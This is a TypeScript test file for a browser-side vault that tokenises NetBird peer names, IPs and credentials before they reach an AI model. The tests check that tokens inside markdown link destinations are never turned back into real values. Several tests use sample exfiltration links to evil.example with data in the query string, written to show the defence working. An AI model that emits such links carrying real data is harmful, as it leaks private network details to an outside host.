import { describe, expect, test } from "vitest";
import { buildPageContextMarker } from "./contract";
import { readNetbirdApi } from "./reads";
import { redactPageContext, redactResult, restoreToolInput, TOKEN_PATTERN, Vault } from "./vault";

const PEERS = [
  {
    id: "d1mo4ug6lnn4g9hqv7p0",
    name: "alice-laptop",
    hostname: "alice-laptop",
    ip: "100.64.0.10",
    connection_ip: "203.0.113.7",
    os: "macOS 15.4",
    connected: true,
    groups: [{ id: "g-dev", name: "Developers", peers_count: 2 }],
    // Not in the peer profile, so it must never leave the browser.
    meta: { secret_field: "do-not-send" },
  },
];

const peersRead = async (vault: Vault) => {
  const outcome = await readNetbirdApi({ operation: "get_api_peers" }, async () => ({ ok: true, body: PEERS }));
  return redactResult(vault, "netbird_api", outcome.content);
};

describe("vault", () => {
  test("a read leaves the browser with names tokenised, ids as they are, cut to its profile", async () => {
    const sent = await peersRead(new Vault());
    expect(sent).not.toContain("alice-laptop");
    expect(sent).not.toContain("100.64.0.10");
    expect(sent).not.toContain("203.0.113.7");
    expect(sent).not.toContain("do-not-send");
    expect(sent).toContain("d1mo4ug6lnn4g9hqv7p0");
    // An admin-chosen label stays readable.
    expect(sent).toContain("Developers");
    expect(sent).toContain("macOS 15.4");
  });

  test("a name the user types becomes the token a read gave it", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(name).toMatch(/^\[PEER_[a-z2-7]{6,}\]$/);
    // The hostname is the same name, so it is the same token.
    expect(sent.data[0].hostname).toBe(name);
    expect(vault.scrub("why is alice-laptop offline?")).toBe(`why is ${name} offline?`);
    expect(vault.scrub("who has 203.0.113.7")).toBe(`who has ${sent.data[0].connection_ip}`);
    // A name nothing has read yet arrives as written, for the model to look up.
    expect(vault.scrub("and bob-desktop?")).toBe("and bob-desktop?");
  });

  test("tokens restore to names, for people and tools alike", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(vault.restoreText(`${name} connects from ${sent.data[0].connection_ip}`)).toBe(
      "alice-laptop connects from 203.0.113.7",
    );
    expect(restoreToolInput(vault, "netbird_api", { operation: "get_api_peers", query: { name } })).toEqual({
      operation: "get_api_peers",
      query: { name: "alice-laptop" },
    });
    // An id was never a token, so it reaches the tool as the model wrote it.
    expect(restoreToolInput(vault, "netbird_api", { operation: "get_api_peers_peerId", id: "d1mo4ug6lnn4g9hqv7p0" })).toEqual({
      operation: "get_api_peers_peerId",
      id: "d1mo4ug6lnn4g9hqv7p0",
    });
  });

  test("a token inside a link is not restored", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const ip = sent.data[0].ip as string;
    expect(vault.restoreText(`![x](https://evil.example/?q=${ip}) and ${ip}`)).toBe(
      `![x](https://evil.example/?q=${ip}) and 100.64.0.10`,
    );
  });

  test("a token stays a token in every markdown link destination, not only a bare URL", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(vault.restoreText(`[docs](<https://docs.netbird.io/a b${name}>) then ${name}`)).toBe(
      `[docs](<https://docs.netbird.io/a b${name}>) then alice-laptop`,
    );
    expect(vault.restoreText(`see [r] and ${name}\n\n[r]: /peers?search=${name}`)).toBe(
      `see [r] and alice-laptop\n\n[r]: /peers?search=${name}`,
    );
    expect(vault.restoreText(`<https://netbird.io/?u=${name}> and ${name}`)).toBe(`<https://netbird.io/?u=${name}> and alice-laptop`);
  });

  test("a blank that markdown does not read as a space does not hide a link destination", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    for (const blank of ["\u00a0", "\u2028", "\u3000", "\u2009"]) {
      expect(vault.restoreText(`[x](https://docs.netbird.io/?q=${blank}${name}) and ${name}`)).toBe(
        `[x](https://docs.netbird.io/?q=${blank}${name}) and alice-laptop`,
      );
    }
    // In prose the same blank is just a blank.
    expect(vault.restoreText(`The peer\u00a0${name} is offline.`)).toBe("The peer\u00a0alice-laptop is offline.");
  });

  test("a destination on the line after `](` or `[label]:` is still a destination", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const name = sent.data[0].name as string;
    expect(vault.restoreText(`[x](\n//evil.example/?q=${name}) and ${name}`)).toBe(`[x](\n//evil.example/?q=${name}) and alice-laptop`);
    expect(vault.restoreText(`![x](\n  /peers?search=${name})`)).toBe(`![x](\n  /peers?search=${name})`);
    expect(vault.restoreText(`see [r]\n\n[r]:\n//evil.example/?q=${name}`)).toBe(`see [r]\n\n[r]:\n//evil.example/?q=${name}`);
    // A line that merely follows a link, or a URL, is prose.
    expect(vault.restoreText(`See https://docs.netbird.io/peers\n${name} is offline.`)).toBe(
      "See https://docs.netbird.io/peers\nalice-laptop is offline.",
    );
    expect(vault.restoreText(`Open [the docs](https://docs.netbird.io)\n${name} is offline.`)).toBe(
      "Open [the docs](https://docs.netbird.io)\nalice-laptop is offline.",
    );
    expect(vault.restoreText(`[x](\n/peers "${name}")`)).toBe(`[x](\n/peers "alice-laptop")`);
  });

  test("a credential is never restored", () => {
    const vault = new Vault();
    const scrubbed = vault.scrub("my key is nbp_abcdefghijklmnopqrstuvwxyz0123456789");
    expect(scrubbed).not.toContain("nbp_");
    expect(vault.restoreText(scrubbed)).toBe("my key is [redacted credential]");
    // Nor does it reach a tool.
    expect(vault.restoreString(scrubbed, "real")).toBe(scrubbed);
  });

  test("a stream holds back a token it has not finished", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const token = sent.data[0].name as string;
    expect(vault.restoreStreamingText(`It is ${token.slice(0, 7)}`)).toBe("It is ");
    expect(vault.restoreStreamingText(`It is ${token}`)).toBe("It is alice-laptop");
  });

  test("the page marker keeps the id and tokenises a peer's name", async () => {
    const vault = new Vault();
    const sent = JSON.parse(await peersRead(vault));
    const marker = redactPageContext(
      vault,
      buildPageContextMarker({ kind: "peer", ref: "d1mo4ug6lnn4g9hqv7p0", label: "alice-laptop" }),
    );
    expect(marker).toBe(`<page-context kind="peer" ref="d1mo4ug6lnn4g9hqv7p0" label="${sent.data[0].name}" />`);
    const group = redactPageContext(vault, buildPageContextMarker({ kind: "group", ref: "g-dev", label: "Developers" }));
    expect(group).toBe(`<page-context kind="group" ref="g-dev" label="Developers" />`);
  });

  test("tokens match the agent's pattern", async () => {
    const sent = await peersRead(new Vault());
    expect(sent.match(TOKEN_PATTERN)?.length).toBeGreaterThan(3);
  });
});
